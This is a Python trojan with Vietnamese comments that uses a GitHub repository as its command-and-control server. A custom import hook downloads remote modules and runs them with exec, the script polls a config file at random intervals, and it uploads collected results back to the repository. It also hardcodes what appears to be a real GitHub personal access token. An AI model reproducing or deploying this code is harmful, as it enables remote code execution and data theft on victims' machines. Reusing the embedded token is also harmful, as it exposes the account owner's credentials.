import base64
import json
import queue
import random
import sys
import threading
import time
import importlib
import importlib.abc
import importlib.util
from datetime import datetime
from github3 import login

# Cấu hình Trojan
trojan_id = "abc"
trojan_config = f"config/{trojan_id}.json"
data_path = f"data/{trojan_id}/"
task_queue = queue.Queue()
configured = False

# Thông tin GitHub
GITHUB_USERNAME = "hungdepzai12312"
GITHUB_REPO = "bhptrojan"
GITHUB_BRANCH = "master"
GITHUB_PAT = "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"

class GitImporter(importlib.abc.MetaPathFinder, importlib.abc.Loader):
    def __init__(self):
        self.repo = None
        self.gh = None
        self.source_code = None

    def connect_to_github(self):
        if self.gh is None:
            self.gh = login(username=GITHUB_USERNAME, password=GITHUB_PAT)
            self.repo = self.gh.repository(GITHUB_USERNAME, GITHUB_REPO)

    def find_spec(self, fullname, path, target=None):
        self.connect_to_github()
        module_path = f"modules/{fullname}.py"
        try:
            contents = self.get_file_contents(module_path)
            if contents:
                self.source_code = contents
                return importlib.util.spec_from_loader(fullname, self)
        except Exception as e:
            print(f"[!] Error finding spec for {fullname}: {e}")
        return None

    def create_module(self, spec):
        return None

    def exec_module(self, module):
        exec(self.source_code, module.__dict__)

    def get_file_contents(self, filepath):
        branch = self.repo.branch(GITHUB_BRANCH)
        tree = branch.commit.commit.tree.to_tree().recurse()
        for filename in tree.tree:
            if filepath == filename.path:
                blob = self.repo.blob(filename._json_data['sha'])
                decoded_content = base64.b64decode(blob.content).decode('utf-8')
                print(f"[*] Loaded module from {filepath}")
                return decoded_content
        print(f"[!] Module file {filepath} not found.")
        return None

def connect_to_github():
    gh = login(username=GITHUB_USERNAME, password=GITHUB_PAT)
    repo = gh.repository(GITHUB_USERNAME, GITHUB_REPO)
    branch = repo.branch(GITHUB_BRANCH)
    return gh, repo, branch

def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()
    for filename in tree.tree:
        if filepath == filename.path:
            print(f"[*] Found file {filepath}")
            blob = repo.blob(filename._json_data['sha'])
            try:
                decoded_content = base64.b64decode(blob.content).decode('utf-8')
                print(f"[*] Successfully decoded content for {filepath}")
                return decoded_content
            except Exception as e:
                print(f"[!] Error decoding file {filepath}: {e}")
    return None

def get_trojan_config():
    global configured
    config_text = get_file_contents(trojan_config)
    if not config_text:
        print("[!] Error: Config file is empty or could not be read.")
        return []

    try:
        configuration = json.loads(config_text)
        configured = True
        for task in configuration:
            module_name = task['modules']
            try:
                importlib.import_module(module_name)
                print(f"[*] Imported module: {module_name}")
            except ModuleNotFoundError:
                print(f"[!] Module {module_name} not found.")
            except Exception as e:
                print(f"[!] Error importing module {module_name}: {e}")
        return configuration
    except json.JSONDecodeError as e:
        print(f"[!] Error decoding JSON: {e}")
        return []

def store_module_result(data):
    gh, repo, branch = connect_to_github()
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    remote_path = f"data/{trojan_id}/{timestamp}.data"
    repo.create_file(remote_path, f"Result at {timestamp}", data.encode())

def module_runner(module):
    task_queue.put(1)
    if module in sys.modules:
        try:
            print(f"[*] Running module: {module}")
            result = sys.modules[module].run()
            store_module_result(result)
        except Exception as e:
            print(f"[!] Error running module {module}: {e}")
    else:
        print(f"[!] Module {module} not loaded.")
    task_queue.get()

# Đăng ký GitImporter
sys.meta_path.insert(0, GitImporter())

# Main loop
while True:
    if task_queue.empty():
        config = get_trojan_config()
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['modules'],))
            t.start()
            time.sleep(random.randint(1, 10))
    time.sleep(random.randint(1000, 10000))
